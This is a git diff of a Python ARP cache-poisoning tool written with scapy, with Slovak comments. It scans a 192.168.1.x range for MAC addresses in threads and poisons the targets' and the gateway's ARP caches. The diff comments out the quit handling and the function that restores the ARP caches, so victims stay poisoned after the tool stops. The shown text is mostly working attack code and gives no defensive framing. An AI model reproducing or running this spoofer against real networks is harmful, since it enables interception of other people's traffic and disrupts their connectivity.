@@ -15,14 +15,12 @@ MAC = TARGET = 1
 
 # riesenie threadu zo stack overflow  - https://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
 class ThreadWithReturnValue(Thread):
-    def __init__(self, group=None, target=None, name=None,
-                 args=(), kwargs={}, Verbose=None):
+    def __init__(self, group=None, target=None, name=None, args=(), kwargs={}, Verbose=None):
         Thread.__init__(self, group, target, name, args, kwargs)
         self._return = None
     def run(self):
         if self._target is not None:
-            self._return = self._target(*self._args,
-                                                **self._kwargs)
+            self._return = self._target(*self._args, **self._kwargs)
     def join(self, *args):
         Thread.join(self, *args)
         return self._return
@@ -37,7 +35,6 @@ def get_MAC(interface, target_IP):
     p.pdst = target_IP
     reply, unans = sr(p, timeout=1, verbose=0)
     if len(unans) > 0:
-        # print("Fail to obrtain MAC address")
         return 
     return reply[0][1].hwsrc
 
@@ -62,26 +59,26 @@ def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
         except Empty:
             print ('Something broke.')
         
-        cmd = item[0].lower()
-        if cmd == 'quit':
-            finish = True
+        # cmd = item[0].lower()
+        # if cmd == 'quit':
+        #     finish = True
 
     # we are done, reset every host
-    restore_ARP_caches(targets, gateway)
+    # restore_ARP_caches(targets, gateway)
 
 
-def restore_ARP_caches(targets, gateway, verbose=True):
-    print ('Stopping the attack, restoring ARP cache')
-    for i in range(3):
-        if verbose:
-            print ("ARP %s is at %s" % (gateway[IP], gateway[MAC]))
-        for t in targets:
-            if verbose:
-                print ("ARP %s is at %s" % (t[IP], t[MAC]))
-            send_ARP(t[IP], t[MAC], gateway[IP], gateway[MAC])
-            send_ARP(gateway[IP], gateway[MAC], t[IP], t[MAC])
-        time.sleep(2)
-    print ('Restored ARP caches')
+# def restore_ARP_caches(targets, gateway, verbose=True):
+#     print ('Stopping the attack, restoring ARP cache')
+#     for i in range(3):
+#         if verbose:
+#             print ("ARP %s is at %s" % (gateway[IP], gateway[MAC]))
+#         for t in targets:
+#             if verbose:
+#                 print ("ARP %s is at %s" % (t[IP], t[MAC]))
+#             send_ARP(t[IP], t[MAC], gateway[IP], gateway[MAC])
+#             send_ARP(gateway[IP], gateway[MAC], t[IP], t[MAC])
+#         time.sleep(2)
+#     print ('Restored ARP caches')
 
 
 def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
@@ -101,7 +98,6 @@ def spoofer():
     threads = []
     threadsNum = 0
 
-    # print ('Attacking from interface %s (%s)' % (interface, attacker_MAC))
     potentialTargets = []
     for i in range(2, 20):
         ip = "192.168.1." + str(i)
@@ -109,6 +105,7 @@ def spoofer():
 
     for t in potentialTargets:
         threads.append(ThreadWithReturnValue(target=get_MAC, args=(interface, t)))
+        threads[threadsNum].daemon = True
         threads[threadsNum].start()
         time.sleep(0.01)
         threadsNum+=1
